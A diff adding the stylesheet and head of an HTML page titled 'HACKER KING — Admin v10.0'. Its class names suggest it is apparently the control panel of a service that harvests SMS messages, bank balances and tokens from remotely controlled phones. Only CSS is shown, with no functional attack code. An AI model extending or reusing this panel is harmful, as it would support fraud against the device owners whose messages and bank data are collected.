@@ -1,0 +1,3205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>HACKER KING — Admin v10.0</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<style>
+:root{--bg:#0a0407;--bg-2:#140810;--card:#1a0d16;--card-2:#241320;--border:rgba(255,255,255,0.09);--border-soft:rgba(255,255,255,0.06);--text:#fdf2f8;--muted:#b8a0b0;--label:#7a6270;--primary:#ff2d6f;--primary-soft:rgba(255,45,111,0.13);--pink:#ff6bb5;--pink-soft:rgba(255,107,181,0.13);--green:#00ffa3;--green-soft:rgba(0,255,163,0.13);--red:#ff3355;--red-soft:rgba(255,51,85,0.13);--amber:#ffb020;--amber-soft:rgba(255,176,32,0.13);--blue:#4f9dff;--blue-soft:rgba(79,157,255,0.13);--violet:#c84bff;--violet-soft:rgba(200,75,255,0.13);--lime:#b4ff2e;--neon:#ff2d6f}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{background:linear-gradient(135deg,#1a0a14 0%,#0d050a 50%,#050208 100%);background-attachment:fixed;color:var(--text);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;line-height:1.4;padding-bottom:120px;overflow-x:hidden;-webkit-font-smoothing:antialiased;min-height:100vh}
+::selection{background:var(--pink);color:#fff}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--violet),var(--pink));border-radius:6px}
+::-webkit-scrollbar-track{background:transparent}
+.app-bar{position:sticky;top:0;z-index:100;background:rgba(20,8,16,0.9);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border-bottom:1px solid var(--border);padding:8px 14px 6px;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
+.app-bar-row{display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap}
+.app-title{font-weight:900;font-size:14px;letter-spacing:-0.3px;display:flex;align-items:center;gap:6px;background:linear-gradient(100deg,#fff,#ff6bb5,#00ffa3);background-size:200% 100%;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.app-title small{color:var(--label);font-weight:500;font-size:9px;letter-spacing:0.5px;-webkit-text-fill-color:var(--label)}
+.status-chips{display:flex;align-items:center;gap:5px;flex-wrap:wrap}
+.chip{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:999px;font-size:10px;font-weight:700;background:var(--card-2);border:1px solid var(--border);color:var(--muted);white-space:nowrap}
+.chip .dot{width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
+.chip .dot.pulse{animation:pulse-dot 1.6s ease-in-out infinite}
+@keyframes pulse-dot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.85)}}
+.chip.green{background:var(--green-soft);border-color:rgba(0,255,163,0.4);color:var(--green)}
+.chip.amber{background:var(--amber-soft);border-color:rgba(255,176,32,0.35);color:var(--amber)}
+.chip.blue{background:var(--blue-soft);border-color:rgba(79,157,255,0.35);color:var(--blue)}
+.chip.red{background:var(--red-soft);border-color:rgba(255,51,85,0.35);color:var(--red)}
+.bot-status-badge{padding:3px 8px;border-radius:6px;font-size:10px;font-weight:800;display:inline-flex;align-items:center;gap:4px;letter-spacing:.5px}
+.bot-status-badge.running{background:linear-gradient(100deg,#00ffa3,#ff2d6f);color:#0a0407;box-shadow:0 0 12px rgba(255,45,111,0.4)}
+.bot-status-badge.stopped{background:var(--red-soft);color:var(--red);border:1px solid rgba(255,51,85,0.35)}
+.tabs{display:flex;gap:2px;overflow-x:auto;padding:4px 0 0;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tab{flex:0 0 auto;padding:6px 12px;font-size:12px;font-weight:700;color:var(--muted);background:transparent;border:none;cursor:pointer;border-bottom:2px solid transparent;transition:color .15s,border-color .15s;white-space:nowrap}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--neon);border-bottom-color:var(--neon);text-shadow:0 0 10px var(--neon),0 0 20px rgba(255,45,111,0.25)}
+.marquee-bar{background:linear-gradient(90deg,rgba(255,45,111,0.15) 0%,rgba(200,75,255,0.15) 50%,rgba(0,255,163,0.15) 100%);border-bottom:1px solid rgba(255,45,111,0.3);padding:6px 0;overflow:hidden;white-space:nowrap;position:sticky;top:74px;z-index:99}
+.marquee-track{display:inline-flex;gap:60px;animation:marquee-ltr 22s linear infinite;padding-left:100%;will-change:transform}
+.marquee-track span{font-size:11px;font-weight:800;color:var(--pink);letter-spacing:0.3px;display:inline-flex;align-items:center;gap:6px}
+.marquee-track span::before{content:'⚡';font-size:12px}
+@keyframes marquee-ltr{0%{transform:translateX(-100%)}100%{transform:translateX(0)}}
+.container-app{max-width:900px;margin:0 auto;padding:10px 12px 500px}
+.device-card{background:linear-gradient(160deg,rgba(36,19,32,0.95),rgba(20,8,16,0.95));border:1px solid var(--border);border-radius:14px;padding:12px;margin-bottom:10px;box-shadow:0 4px 20px rgba(0,0,0,0.4),inset 0 1px 0 rgba(255,255,255,0.04);position:relative;overflow:hidden}
+.device-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#ff2d6f,#c84bff,#00ffa3,#b4ff2e,#ff2d6f);background-size:200% 100%}
+.device-head{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px}
+.device-head-left{display:flex;align-items:center;gap:10px;min-width:0}
+.device-avatar{position:relative;width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,rgba(255,45,111,0.22),rgba(0,255,163,0.15));display:flex;align-items:center;justify-content:center;color:var(--pink);font-size:15px;flex-shrink:0;border:1px solid rgba(255,45,111,0.4)}
+.device-avatar .live-dot{position:absolute;bottom:-1px;right:-1px;width:10px;height:10px;border-radius:50%;border:2px solid var(--card);background:var(--red)}
+.device-avatar .live-dot.online{background:var(--green);box-shadow:0 0 8px var(--green)}
+.device-avatar .live-dot.online.pulse{animation:pulse-dot 1.6s ease-in-out infinite}
+.device-name{font-weight:800;font-size:13px;letter-spacing:-0.2px;color:var(--text)}
+.device-sub{font-size:10px;color:var(--muted);margin-top:1px;font-family:'JetBrains Mono',monospace}
+.icon-btn{width:30px;height:30px;border-radius:10px;border:1px solid var(--border);background:var(--card-2);display:inline-flex;align-items:center;justify-content:center;color:var(--muted);cursor:pointer;transition:all .15s;font-size:12px}
+.icon-btn:hover{color:var(--text);border-color:var(--primary)}
+.icon-btn.danger{color:var(--red)}
+.icon-btn.danger:hover{background:var(--red-soft);border-color:var(--red)}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.info-cell{background:var(--card-2);border:1px solid var(--border-soft);border-radius:8px;padding:6px 9px}
+.info-cell .lbl{display:flex;align-items:center;gap:4px;font-size:8.5px;font-weight:800;text-transform:uppercase;letter-spacing:0.6px;color:var(--label);margin-bottom:2px}
+.info-cell .lbl i{font-size:9px;opacity:0.7;color:var(--primary)}
+.info-cell .val{font-size:11px;font-weight:700;color:var(--text);word-break:break-word}
+.info-cell .val.mono{font-family:'JetBrains Mono',monospace;font-size:10px}
+.bank-card{background:linear-gradient(135deg,rgba(0,255,163,0.14),rgba(255,45,111,0.07));border:1px solid rgba(0,255,163,0.4);border-radius:12px;padding:12px 14px;margin-top:8px;display:flex;align-items:center;justify-content:space-between;gap:10px;position:relative;overflow:hidden}
+.bank-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,#00ffa3,#ff2d6f);box-shadow:0 0 12px #00ffa3}
+.bank-card-info{flex:1;min-width:0;padding-left:6px}
+.bank-card-name{font-size:10px;font-weight:800;color:#00ffa3;letter-spacing:0.8px;text-transform:uppercase;margin-bottom:3px;display:flex;align-items:center;gap:4px}
+.bank-card-balance{font-size:20px;font-weight:900;color:#fff;letter-spacing:-0.5px;font-family:'JetBrains Mono',monospace}
+.bank-card-balance small{font-size:12px;font-weight:700;color:var(--green);margin-right:3px}
+.bank-card-sms{font-size:9px;color:var(--muted);opacity:0.9;margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px;font-family:'JetBrains Mono',monospace}
+.bank-card-refresh{width:34px;height:34px;border-radius:9px;background:rgba(0,255,163,0.15);border:1px solid rgba(0,255,163,0.4);color:var(--green);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:14px;transition:all .2s}
+.bank-card-refresh:hover{background:rgba(0,255,163,0.3);transform:rotate(60deg)}
+.active-box{margin-top:16px;padding:18px;border-radius:14px;background:linear-gradient(160deg,rgba(180,255,46,.1),rgba(255,45,111,.06));border:1.5px solid rgba(180,255,46,.4);text-align:center;position:relative;overflow:hidden}
+.active-box-title{font-size:10px;font-weight:900;letter-spacing:2px;text-transform:uppercase;color:var(--lime);margin-bottom:8px}
+.active-box-num{font-family:'JetBrains Mono',monospace;font-size:16px;font-weight:800;color:var(--text);letter-spacing:-.5px;margin-bottom:4px;word-break:break-all}
+.active-box-sub{font-size:11px;color:var(--muted);margin-bottom:14px}
+.active-btn{width:100%;padding:14px;border:none;border-radius:12px;cursor:pointer;font-family:'Inter',sans-serif;font-size:14px;font-weight:900;letter-spacing:1.5px;text-transform:uppercase;color:#0a0407;background:linear-gradient(100deg,var(--lime),var(--neon));transition:transform .2s,box-shadow .3s;box-shadow:0 4px 15px rgba(180,255,46,0.3)}
+.active-btn.running{background:linear-gradient(100deg,#ff3355,#b91c1c);color:#fff}
+.pulse-live{display:inline-flex;align-items:center;gap:6px;font-size:10px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--lime);background:rgba(180,255,46,.12);border:1px solid rgba(180,255,46,.4);padding:5px 12px;border-radius:99px}
+.pulse-live .d{width:7px;height:7px;border-radius:50%;background:var(--lime);box-shadow:0 0 10px var(--lime);animation:pulse-dot 1.5s ease-in-out infinite}
+.auto-log{max-height:180px;overflow-y:auto;margin-top:12px;padding:10px 12px;border-radius:10px;background:var(--bg-2);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:10.5px;line-height:1.7;color:var(--muted)}
+.auto-log-item{padding:4px 0;border-bottom:1px solid var(--border-soft)}
+.auto-log-item .ts{color:var(--label);font-size:9.5px}
+.auto-log-item .ok{color:var(--green);font-weight:700}
+.auto-log-item .err{color:var(--red);font-weight:700}
+.auto-log-item .info{color:var(--primary);font-weight:700}
+.live-badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:900;color:var(--green);background:rgba(0,255,163,.1);border:1px solid rgba(0,255,163,.35);padding:4px 10px;border-radius:99px;letter-spacing:1px}
+.live-badge .ld{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse-dot 1.2s ease-in-out infinite}
+.live-badge.turbo{background:rgba(255,45,111,.15);border-color:rgba(255,45,111,.4);color:var(--neon)}
+.live-badge.turbo .ld{background:var(--neon)}
+.live-badge.off{color:var(--red);background:rgba(255,51,85,.1);border-color:rgba(255,51,85,.35)}
+.live-badge.off .ld{background:var(--red)}
+.msg-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.msg-count-chip{font-size:10px;font-weight:800;letter-spacing:0.5px;text-transform:uppercase;color:var(--muted);background:var(--card-2);border:1px solid var(--border);padding:5px 10px;border-radius:99px;font-family:'JetBrains Mono',monospace}
+.msg-count-chip b{color:var(--neon);font-size:11px}
+.refresh-btn{display:flex;align-items:center;gap:5px;padding:6px 12px;border-radius:8px;background:var(--primary-soft);border:1px solid rgba(255,45,111,.35);color:var(--primary);font-family:'Inter',sans-serif;font-size:10px;font-weight:800;letter-spacing:0.5px;text-transform:uppercase;cursor:pointer;transition:all .2s}
+.refresh-btn:hover{background:rgba(255,45,111,.25)}
+.refresh-btn.spinning i{animation:spin 0.8s linear infinite}
+.action-box{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:10px;margin-bottom:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3)}
+.action-box-title{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:8px;display:flex;align-items:center;gap:5px}
+.actions-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px}
+.action-btn{background:var(--card-2);border:1px solid var(--border-soft);border-radius:10px;padding:8px 4px 6px;display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;transition:all .15s}
+.action-btn:hover{border-color:var(--primary);background:var(--primary-soft);transform:translateY(-1px)}
+.action-btn:active{transform:scale(0.96)}
+.action-btn i{font-size:14px;color:var(--text)}
+.action-btn .t{font-size:8.5px;font-weight:700;color:var(--muted);text-align:center;line-height:1.1}
+.action-btn:hover i{color:var(--primary)}
+.action-btn:hover .t{color:var(--primary)}
+.action-btn.primary-soft{background:var(--primary-soft);border-color:rgba(255,45,111,0.35)}
+.action-btn.primary-soft i,.action-btn.primary-soft .t{color:var(--primary)}
+.action-btn.danger-soft{background:rgba(255,51,85,0.15);border-color:rgba(255,51,85,0.45)}
+.action-btn.danger-soft i,.action-btn.danger-soft .t{color:#ff5c7a}
+.action-btn.auto-token-btn{background:linear-gradient(135deg,rgba(180,255,46,.12),rgba(255,45,111,.08));border-color:rgba(180,255,46,.4)}
+.action-btn.auto-token-btn i,.action-btn.auto-token-btn .t{color:var(--lime)}
+.action-btn.sms-store-btn{background:linear-gradient(135deg,rgba(180,255,46,.12),rgba(255,107,181,.08));border-color:rgba(180,255,46,.4)}
+.action-btn.sms-store-btn i,.action-btn.sms-store-btn .t{color:var(--lime)}
+.action-btn.sms-store-btn.on{background:linear-gradient(135deg,rgba(180,255,46,.3),rgba(0,255,163,.2));border-color:rgba(180,255,46,.8);box-shadow:0 0 14px rgba(180,255,46,.4)}
+.action-btn.sms-store-btn.on i,.action-btn.sms-store-btn.on .t{color:#00ffa3;font-weight:900}
+.sms-item{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:10px 12px;margin-bottom:6px;transition:border-color .15s;box-shadow:0 2px 8px rgba(0,0,0,0.2);position:relative}
+.sms-item.debit{border-left:3px solid var(--red)}
+.sms-top{display:flex;justify-content:space-between;align-items:flex-start;gap:6px;margin-bottom:4px}
+.sms-sender{font-weight:800;font-size:11.5px;color:var(--text);display:flex;align-items:center;flex-wrap:wrap;gap:5px}
+.sms-sender .serial{display:inline-flex;align-items:center;background:var(--primary-soft);color:var(--primary);font-weight:900;font-family:'JetBrains Mono',monospace;font-size:10px;padding:2px 8px;border-radius:6px;cursor:pointer;border:1px solid rgba(255,45,111,0.35)}
+.sms-sender .serial.missing{background:var(--card-2);color:var(--muted);border:1px dashed var(--border);cursor:default}
+.sms-meta{display:flex;align-items:center;gap:4px;flex-wrap:wrap}
+.badge-soft{padding:1px 6px;border-radius:5px;font-size:9px;font-weight:800;letter-spacing:0.4px}
+.badge-soft.credit{background:var(--green-soft);color:var(--green);border:1px solid rgba(0,255,163,0.35)}
+.badge-soft.debit{background:var(--red-soft);color:var(--red);border:1px solid rgba(255,51,85,0.35)}
+.badge-soft.normal{background:var(--primary-soft);color:var(--primary);border:1px solid rgba(255,45,111,0.35)}
+.badge-soft.sim{background:var(--card-2);color:var(--muted);border:1px solid var(--border)}
+.badge-soft.new{background:var(--amber);color:#0a0407;animation:pulse-dot 1.6s ease-in-out infinite}
+.sms-date{font-size:9.5px;color:var(--label);white-space:nowrap;font-family:'JetBrains Mono',monospace}
+.sms-body{font-size:11.5px;color:#d8c2d0;line-height:1.5;margin-bottom:6px;word-break:break-word}
+.sms-body mark{background:var(--amber);color:#0a0407;padding:0 3px;border-radius:3px;font-weight:800}
+.sms-actions{display:flex;gap:4px}
+.mini-btn{padding:3px 8px;border-radius:6px;font-size:10px;font-weight:700;background:var(--card-2);border:1px solid var(--border);color:var(--muted);cursor:pointer;display:inline-flex;align-items:center;gap:3px;transition:all .15s}
+.mini-btn:hover{color:var(--text);border-color:var(--primary)}
+.mini-btn.danger{color:var(--red)}
+.mini-btn.danger:hover{background:var(--red-soft);border-color:var(--red)}
+.mini-btn.primary{color:var(--primary)}
+.mini-btn.primary:hover{background:var(--primary-soft);border-color:var(--primary)}
+.mini-btn.spinning i{animation:spin 0.8s linear infinite}
+.search-wrap{position:relative;margin-bottom:10px}
+.search-wrap i{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--label);font-size:12px}
+.search-wrap .clear-search{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:transparent;border:none;color:var(--label);cursor:pointer;font-size:12px;display:none}
+.search-wrap .clear-search.show{display:block}
+.search-wrap .clear-search:hover{color:var(--red)}
+.search-input{width:100%;padding:9px 32px 9px 32px;background:var(--card);border:1px solid var(--border);border-radius:12px;font-size:12px;color:var(--text);outline:none;transition:border-color .15s,box-shadow .15s;font-family:'Inter',sans-serif}
+.search-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(255,45,111,0.18),0 0 12px rgba(255,45,111,0.15)}
+.search-results-count{font-size:10px;color:var(--primary);padding:3px 8px;background:var(--primary-soft);border:1px solid rgba(255,45,111,0.35);border-radius:999px;font-weight:800}
+.filter-row{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
+.filter-chip{padding:4px 10px;border-radius:999px;background:var(--card);border:1px solid var(--border);font-size:10.5px;font-weight:700;color:var(--muted);cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:4px}
+.filter-chip:hover{color:var(--text);border-color:var(--primary)}
+.filter-chip.active{background:var(--primary-soft);color:var(--primary);border-color:var(--primary)}
+.filter-chip.active.credit{background:var(--green-soft);color:var(--green);border-color:var(--green)}
+.filter-chip.active.debit{background:var(--red-soft);color:var(--red);border-color:var(--red)}
+.filter-chip.active.gold{background:var(--amber-soft);color:var(--amber);border-color:var(--amber)}
+.filter-chip.all-sms-chip{background:var(--pink-soft);color:var(--pink);border-color:rgba(255,107,181,0.35);font-weight:800}
+.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:10px}
+.stat-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:10px 6px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.3)}
+.stat-box .num{font-size:18px;font-weight:900;letter-spacing:-0.5px;color:var(--text)}
+.stat-box .num.green{color:var(--green)}
+.stat-box .num.red{color:var(--red)}
+.stat-box .lbl{font-size:9px;font-weight:800;color:var(--label);text-transform:uppercase;letter-spacing:0.6px;margin-top:2px}
+.device-list-item{background:linear-gradient(120deg,var(--card),var(--card-2));border:1px solid var(--border);border-radius:12px;padding:10px 12px;margin-bottom:6px;display:flex;align-items:center;gap:10px;cursor:pointer;transition:border-color .15s,transform .15s;box-shadow:0 2px 8px rgba(0,0,0,0.2);position:relative;overflow:hidden}
+.device-list-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(180deg,var(--pink),var(--violet));opacity:0.7}
+.device-list-item.online::before{background:linear-gradient(180deg,var(--green),var(--neon));opacity:1;box-shadow:0 0 12px var(--green)}
+.device-list-item:hover{border-color:var(--primary);transform:translateX(2px)}
+.dl-avatar{position:relative;width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,rgba(255,45,111,0.22),rgba(200,75,255,0.15));color:var(--pink);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:11px;flex-shrink:0;font-family:'JetBrains Mono',monospace;border:1px solid rgba(255,45,111,0.4)}
+.dl-avatar .live-dot{position:absolute;bottom:-1px;right:-1px;width:10px;height:10px;border-radius:50%;border:2px solid var(--card);background:var(--red)}
+.dl-avatar .live-dot.online{background:var(--green);box-shadow:0 0 8px var(--green)}
+.dl-avatar .live-dot.online.pulse{animation:pulse-dot 1.6s ease-in-out infinite}
+.dl-info{flex:1;min-width:0}
+.dl-name{font-weight:800;font-size:12px;color:var(--text)}
+.dl-sub{font-size:10px;color:var(--muted);margin-top:1px;font-family:'JetBrains Mono',monospace}
+.dl-badges{display:flex;gap:3px;margin-top:3px;flex-wrap:wrap}
+.dl-badge{font-size:9px;font-weight:800;padding:1px 6px;border-radius:5px}
+.dl-badge.online{background:var(--green-soft);color:var(--green);border:1px solid rgba(0,255,163,0.35)}
+.dl-badge.online.pulse{animation:pulse-dot 1.6s ease-in-out infinite}
+.dl-badge.offline{background:var(--red-soft);color:var(--red);border:1px solid rgba(255,51,85,0.35)}
+.dl-badge.batt{background:var(--amber-soft);color:var(--amber);border:1px solid rgba(255,176,32,0.35)}
+.dl-badge.sim{background:var(--card-2);color:var(--muted);border:1px solid var(--border)}
+.dl-chev{color:var(--label);font-size:12px}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:rgba(20,8,16,0.96);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;align-items:stretch;justify-content:space-around;padding:6px 4px calc(6px + env(safe-area-inset-bottom,0));z-index:200;box-shadow:0 -4px 20px rgba(0,0,0,0.5)}
+.bottom-nav .nav-item{flex:1;background:transparent;border:none;display:flex;flex-direction:column;align-items:center;gap:1px;padding:5px 4px;cursor:pointer;color:var(--muted);font-size:9.5px;font-weight:700;border-radius:12px;transition:color .15s}
+.bottom-nav .nav-item i{font-size:16px}
+.bottom-nav .nav-item.active{color:var(--primary)}
+.page{display:none}
+.page.active{display:block}
+.page-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;gap:8px;flex-wrap:wrap}
+.page-head h2{font-size:15px;font-weight:900;letter-spacing:-0.3px;display:flex;align-items:center;gap:6px;color:var(--text)}
+.page-head h2 i{color:var(--primary)}
+.page-head-actions{display:flex;gap:5px;align-items:center;flex-wrap:wrap}
+.empty{text-align:center;padding:30px 16px;color:var(--muted)}
+.empty i{font-size:30px;margin-bottom:8px;display:block;opacity:0.5}
+.empty p{font-size:12px}
+.spinner{width:20px;height:20px;border:2.5px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin 0.8s linear infinite;margin:16px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-more{display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;color:var(--muted);font-size:11px;font-weight:700}
+.load-more .spinner-small{width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin 0.8s linear infinite}
+.online-check-result{margin-top:8px;padding:8px 10px;border-radius:10px;font-size:11px;font-weight:700;display:none;align-items:center;gap:6px}
+.online-check-result.show{display:flex}
+.online-check-result.online{background:var(--green-soft);color:var(--green);border:1px solid rgba(0,255,163,0.4)}
+.online-check-result.offline{background:var(--red-soft);color:var(--red);border:1px solid rgba(255,51,85,0.4)}
+.online-check-result i{font-size:14px}
+#loginOverlay,#passwordSetOverlay{position:fixed;inset:0;z-index:9999;background:rgba(10,4,7,0.98);backdrop-filter:blur(24px);display:none;align-items:center;justify-content:center;padding:20px}
+#loginOverlay{z-index:9998}
+#loginOverlay.show,#passwordSetOverlay.show{display:flex}
+.login-card{background:linear-gradient(160deg,var(--card),var(--bg-2));border:1px solid var(--border);border-radius:20px;padding:28px 22px;width:100%;max-width:380px;box-shadow:0 20px 60px rgba(0,0,0,0.6);text-align:center;position:relative;overflow:hidden}
+.login-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ff2d6f,#c84bff,#00ffa3,#b4ff2e,#ff2d6f);background-size:200% 100%}
+.login-card h2{font-size:18px;font-weight:900;margin-bottom:6px;background:linear-gradient(100deg,#fff,#ff6bb5,#00ffa3);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.login-card p{font-size:12px;color:var(--muted);margin-bottom:18px}
+.login-card input{width:100%;padding:12px 14px;background:var(--bg-2);border:1px solid var(--border);border-radius:12px;font-size:13px;color:var(--text);outline:none;margin-bottom:10px;font-family:'JetBrains Mono',monospace}
+.login-card input:focus{border-color:var(--pink);box-shadow:0 0 0 3px rgba(255,107,181,0.18)}
+.login-card button{width:100%;padding:12px;background:linear-gradient(100deg,#ff2d6f,#c84bff,#00ffa3);background-size:200% 100%;color:#0a0407;border:none;border-radius:12px;font-size:13px;font-weight:900;letter-spacing:0.5px;cursor:pointer;transition:all .3s}
+.login-card button:hover{background-position:100% 0;transform:translateY(-2px)}
+.login-card button:disabled{opacity:0.5;cursor:not-allowed}
+.login-msg{font-size:11px;margin-top:8px;font-weight:700}
+.login-msg.error{color:var(--red)}
+.login-msg.success{color:var(--green)}
+.modal-content{background:linear-gradient(160deg,var(--card),var(--bg-2))!important;border:1px solid var(--border)!important;border-radius:18px!important;color:var(--text)!important}
+.modal-header{border-bottom:1px solid var(--border)!important;padding:12px 16px!important}
+.modal-title{font-size:14px!important;font-weight:800!important;color:var(--text)!important}
+.modal-body{padding:14px 16px!important}
+.modal-footer{border-top:1px solid var(--border)!important;padding:10px 16px!important}
+.modal .btn-close{filter:invert(1);opacity:0.5}
+.modal .form-control,.modal .form-select{background:var(--bg-2)!important;border:1px solid var(--border)!important;border-radius:10px!important;color:var(--text)!important;padding:8px 12px!important;font-size:12px!important}
+.modal .form-control:focus{border-color:var(--primary)!important;box-shadow:0 0 0 3px rgba(255,45,111,0.18)!important}
+.modal .form-label{font-size:10px!important;font-weight:800!important;text-transform:uppercase;letter-spacing:0.6px;color:var(--muted)!important;margin-bottom:4px}
+.modal .btn-secondary{background:var(--card-2)!important;border:1px solid var(--border)!important;color:var(--text)!important;border-radius:10px!important;font-size:12px!important;font-weight:700!important;padding:7px 14px!important}
+.btn-primary-soft{background:linear-gradient(100deg,var(--pink),var(--violet))!important;border:none!important;color:#fff!important;border-radius:10px!important;font-size:12px!important;font-weight:800!important;padding:7px 14px!important;display:inline-flex;align-items:center;gap:5px}
+.btn-danger-soft{background:var(--red)!important;border:none!important;color:#fff!important;border-radius:10px!important;font-size:12px!important;font-weight:800!important;padding:7px 14px!important;display:inline-flex;align-items:center;gap:5px}
+.toast-daimon{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(120deg,var(--card),var(--bg-2));color:var(--text);padding:10px 18px;border-radius:12px;font-size:12px;font-weight:700;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,0.6);border:1px solid var(--border);opacity:0;transition:opacity .25s,transform .25s;pointer-events:none;max-width:90vw}
+.toast-daimon.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.fd-entry{margin-bottom:10px;padding-bottom:10px;border-bottom:1px dashed var(--border)}
+.fd-entry:last-child{border-bottom:none}
+.fd-date{font-size:10px;color:var(--muted);font-weight:700;margin-bottom:6px}
+.fd-row{display:flex;align-items:center;justify-content:space-between;padding:5px 0;gap:8px}
+.fd-row .k{font-size:11px;color:var(--muted);font-weight:500}
+.fd-row .v{font-size:11.5px;font-weight:700;color:var(--text);flex:1;text-align:right;word-break:break-all;font-family:'JetBrains Mono',monospace}
+.fd-row .copy{color:var(--label);background:transparent;border:none;padding:2px 4px;cursor:pointer;font-size:11px}
+.status-box{padding:8px 10px;border-radius:10px;font-size:11.5px;font-weight:700;display:none;align-items:center;gap:6px;margin-bottom:8px}
+.status-box.show{display:flex}
+.status-box i{font-size:14px;flex-shrink:0}
+.status-box.info{background:var(--primary-soft);color:var(--primary);border:1px solid rgba(255,45,111,0.35)}
+.status-box.success{background:var(--green-soft);color:var(--green);border:1px solid rgba(0,255,163,0.35)}
+.status-box.error{background:var(--red-soft);color:var(--red);border:1px solid rgba(255,51,85,0.35)}
+.status-box.warning{background:var(--amber-soft);color:var(--amber);border:1px solid rgba(255,176,32,0.35)}
+#deviceDataList.collapsed{max-height:320px;overflow-y:auto;padding-right:4px;padding-bottom:20px;-webkit-overflow-scrolling:touch}
+#blockOverlay,#expiryOverlay{position:fixed;inset:0;background:rgba(0,0,0,0.97);display:none;align-items:center;justify-content:center;backdrop-filter:blur(15px);z-index:99996}
+#expiryOverlay{z-index:99997}
+#blockOverlay.show,#expiryOverlay.show{display:flex!important}
+#blockOverlay .card,#expiryOverlay .card{background:var(--card);border:3px solid var(--red);border-radius:16px;max-width:450px;width:90%;padding:35px 28px;text-align:center}
+#blockOverlay .card .icon,#expiryOverlay .card .icon{font-size:4rem;margin-bottom:10px;display:block}
+#blockOverlay .card h2,#expiryOverlay .card h2{color:var(--red);font-size:1.5rem;margin-bottom:12px;font-weight:900;letter-spacing:1px}
+#blockOverlay .card p,#expiryOverlay .card p{color:var(--muted);font-size:0.95rem;margin-bottom:6px;line-height:1.6}
+#expiryOverlay .card .expiry-date{color:var(--amber);font-weight:800;font-size:1rem}
+#blockOverlay .card .contact-msg,#expiryOverlay .card .contact-msg{color:#ff6b85;font-weight:700;font-size:1.1rem;margin-top:12px;padding:10px;border:1px solid var(--red);border-radius:8px;background:rgba(255,51,85,0.1)}
+body.expired .app-bar,body.expired .container-app,body.expired .bottom-nav,body.blocked .app-bar,body.blocked .container-app,body.blocked .bottom-nav{opacity:0.2;pointer-events:none}
+.firebase-status{position:fixed;top:12px;right:20px;z-index:9998;padding:6px 14px;border-radius:20px;font-size:0.65rem;font-weight:800;display:flex;align-items:center;gap:6px;background:var(--green-soft);border:1px solid rgba(0,255,163,0.4);color:var(--green);backdrop-filter:blur(10px)}
+.firebase-status.error{background:var(--red-soft);border-color:rgba(255,51,85,0.4);color:var(--red)}
